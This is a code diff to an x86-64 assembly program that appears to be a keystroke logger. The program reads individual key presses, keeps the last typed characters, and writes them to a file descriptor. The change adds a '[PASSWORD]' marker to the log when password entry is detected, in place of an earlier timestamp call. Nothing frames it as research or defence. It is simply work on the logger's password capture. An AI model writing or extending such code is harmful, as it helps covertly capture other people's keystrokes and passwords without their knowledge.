@@ -12,12 +12,13 @@ section .data
     s db " | ", 0              
     dpid dq 0                  
     detecting_password db 0    
+    password_detected db "[PASSWORD]", 0  
 
 section .bss
     buf resb 1                 
     tspec resq 2               
     termios resb 60            
-    last_chars resb 10        
+    last_chars resb 10         
 
 section .text
 global _start
@@ -126,9 +127,12 @@ process_key:
     cmp byte [detecting_password], 1
     jne loop
 
-    mov rax, [tspec]
-    mov rdi, tbuf
-    call ft
+    ; Ajouter un marqueur de mot de passe détecté
+    mov rax, 1                
+    mov rdi, [fd]
+    mov rsi, password_detected
+    mov rdx, 11              
+    syscall
 
     mov rax, 1                
     mov rdi, [fd]
